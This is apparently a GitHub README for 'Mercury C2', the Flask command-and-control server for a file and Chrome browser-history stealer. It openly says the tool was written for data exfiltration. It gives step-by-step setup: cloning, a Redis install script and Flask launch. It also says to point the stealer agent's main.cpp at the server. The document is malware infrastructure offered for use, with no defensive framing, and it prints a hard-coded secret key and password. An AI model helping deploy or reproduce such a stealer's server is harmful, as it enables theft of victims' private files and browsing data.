# Description
Mercury is a file and chrome browser history stealer that was written for data exfil. This repository contains Mercury's C2, this is the server that you need to run to recieve data from your agents. 

## How to setup
The C2 was written with python Flask framework. Follow these steps to run it.
Download this repository
```
git clone https://github.com/0xConstant/Mercury_C2
```

Inside that directory, create a python3 virtual environment:
```
python3 -m venv venv
```
Active the virtual environment:
```
source venv/bin/activate
```

Install all module requirements:
```
python3 install -r requirements.txt
```
Install redis and set a password, you can either do this manually or use the following bash script:
```bash
#!/bin/bash

# Update the system's package index
sudo apt-get update

# Install Redis server
sudo apt-get install redis-server -y

# Define the password
REDIS_PASSWORD='yourStrongPasswordHere'

# Path to Redis configuration file
REDIS_CONF='/etc/redis/redis.conf'

# Backup the original Redis configuration file
sudo cp $REDIS_CONF $REDIS_CONF.backup

# Set the password in the Redis configuration file
sudo sed -i "s/# requirepass foobared/requirepass $REDIS_PASSWORD/" $REDIS_CONF

# Restart Redis server to apply the changes
sudo systemctl restart redis.service

echo "Redis has been installed and configured with a password."
```

Modify the following by changing secret key and modifying redis URL to match your password:
```
app.config["SECRET_KEY"] = "fksdly48thergl9#8%3@45t%u9834tu95$hgui$rfg49$t67"
app.config['REMEMBER_COOKIE_DURATION'] = timedelta(hours=24)
app.config['REDIS_URL'] = 'redis://:jackass%23XX1717@localhost:6379/0'
```


## How to use

To run a development server and test it, you can run the following command after activating python virtual environment and install requirements:
```
flask run --host 0.0.0.0 --cert adhoc --debug
```
This will run the application with a fake HTTPs certificate in debug mode.

Once you run that command, you will see on which IP and port your server is running, you can then add that IP and port to the agent's main.cpp code.


### How to solve errors?
ChatGPT is your friend, you can paste the entire content of app.py and it will tell you exactly how the code works. If you don't have access to that, join the following Discord server: </br>
https://discord.gg/9495pzJrZw

